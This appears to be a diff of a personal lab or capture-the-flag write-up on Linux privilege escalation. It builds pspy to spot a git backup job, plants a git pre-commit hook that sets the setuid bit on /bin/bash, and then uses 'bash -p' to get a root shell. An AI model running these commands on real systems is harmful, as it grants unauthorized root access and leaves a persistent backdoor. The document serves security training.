@@ -369,5 +369,29 @@ cd pspy
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build .
 ```
 >[!example]- Result
->![[Pasted image 20250227152415.png]]
+>![[Pasted image 20250227153859.png]]
+>![[Pasted image 20250227153325.png]]
+
+- It looks like is doing sync the git repo and making some backups, we can use hooks to write a [pre commit action](https://gtfobins.github.io/gtfobins/git/#shell) when a commit happend
+```bash
+echo 'chmod u+s /bin/bash' > /home/dev01/.git/hooks/pre-commit
+chmod +x ~/.git/hooks/pre-commit
+watch -n 1 ls -l /bin/bash
+```
+
+- And if we wait...
+>[!example]- Before
+>![[Pasted image 20250227154300.png]]
+
+>[!example]- After
+>![[Pasted image 20250227154856.png]]
+
+- perfect now we are root
+```bash
+bash -p
+```
+>[!example]- Result
+>![[Pasted image 20250227154958.png]]
+
+
 
